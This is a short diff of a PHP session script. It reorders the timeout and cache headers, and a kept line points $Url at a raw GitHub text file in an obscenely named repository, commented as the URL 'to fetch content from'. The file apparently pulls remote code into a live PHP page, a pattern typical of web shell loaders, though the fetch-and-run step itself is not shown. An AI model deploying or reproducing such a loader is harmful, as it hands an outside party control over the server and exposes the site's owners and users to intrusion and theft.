@@ -1,13 +1,11 @@
 <?php
-// Start the session
-session_start();
-
-// Prevent caching of the login page and other sensitive pages
+// Set session timeout and prevent caching before session start
+ini_set('session.gc_maxlifetime', 3600); // Set session timeout to 1 hour
 header("Cache-Control: no-cache, must-revalidate");
 header("Expires: 0");
 
-// Ensure session timeout is long enough (1 hour)
-ini_set('session.gc_maxlifetime', 3600); // Set session timeout to 1 hour
+// Start the session
+session_start();
 
 // Your URL to fetch content from
 $Url = "https://raw.githubusercontent.com/bokaman12/7h3o/refs/heads/main/bandir-put/eikhane/ki/koros/fuck/you/f1.txt";
